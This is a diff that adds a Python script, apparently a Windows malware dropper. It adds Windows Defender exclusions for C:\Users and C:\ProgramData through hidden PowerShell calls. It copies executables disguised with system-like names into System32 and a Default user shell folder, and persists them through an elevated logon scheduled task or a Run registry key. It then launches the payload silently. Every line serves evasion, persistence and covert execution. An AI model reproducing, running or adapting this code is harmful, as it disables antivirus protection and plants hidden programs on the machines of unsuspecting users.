@@ -1,0 +1,84 @@
+import os
+import shutil
+from pathlib import Path
+import subprocess
+import time
+import sys
+import winreg
+import winreg as reg
+appdata_local = os.path.expandvars('%LOCALAPPDATA%')
+destination_folder_f = os.path.join(appdata_local, 'SystemEchoData')
+os.makedirs(destination_folder_f, exist_ok=True)
+destination_folder = 'C:/Users/Default/AppData/Local/Microsoft/Windows/Shell'
+os.makedirs(destination_folder, exist_ok=True)
+folder_to_exclude = 'C:\\ProgramData'
+folder_to_exclude_Us = 'C:\\Users'
+destination_folder_sys = 'C:\\Windows\\System32'
+exe_path = os.path.join(destination_folder_sys, 'AppShellSurrogate.exe')
+task_name = 'TaskSync'
+if os.path.isfile(exe_path):
+    sys.exit()
+
+def check_task_exists(task_name):
+    try:
+        result = subprocess.Popen(['schtasks', '/query'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        output, _ = result.communicate()
+        return task_name in output
+    except Exception:
+        return False
+    else:
+        pass
+
+def delete_task(task_name):
+    try:
+        subprocess.Popen(['schtasks', '/delete', '/tn', task_name, '/f'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).wait()
+    except subprocess.CalledProcessError:
+        return None
+    else:
+        pass
+if check_task_exists(task_name):
+    delete_task(task_name)
+
+def add_folder_exclusion_to_defender(folder_path):
+    if not os.path.exists(folder_path):
+        return
+    try:
+        command = f"Add-MpPreference -ExclusionPath '{folder_path}'"
+        subprocess.Popen(['powershell', '-Command', command], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).wait()
+    except subprocess.CalledProcessError:
+        return None
+    else:
+        pass
+add_folder_exclusion_to_defender(folder_to_exclude_Us)
+add_folder_exclusion_to_defender(folder_to_exclude)
+
+def extract_file(resource_name, output_path):
+    if not os.path.exists(output_path):
+        current_dir = Path(__file__).resolve().parent
+        resource_path = current_dir / resource_name
+        if resource_path.exists():
+            shutil.copy(resource_path, output_path)
+        else:
+            raise FileNotFoundError(f'Resource {resource_path} not found')
+if __name__ == '__main__':
+    resources = {'AppShellSurrogate.exe': os.path.join(destination_folder_sys, 'AppShellSurrogate.exe'), 'ShellSyncApp.exe': os.path.join(destination_folder, 'ShellSyncApp.exe')}
+    for resource_name, output_path in resources.items():
+        extract_file(resource_name, output_path)
+
+def add_to_winlogon(exe_path, task_name='TaskSync'):
+    command = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"', '/sc', 'onlogon', '/rl', 'highest']
+    try:
+        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).wait()
+        return True
+    except Exception:
+        return False
+    else:
+        pass
+if not add_to_winlogon(exe_path, task_name):
+    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(reg_key, 'AppShellSurrogate', 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(reg_key)
+time.sleep(3)
+subprocess.Popen(exe_path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+time.sleep(3)
+sys.exit()
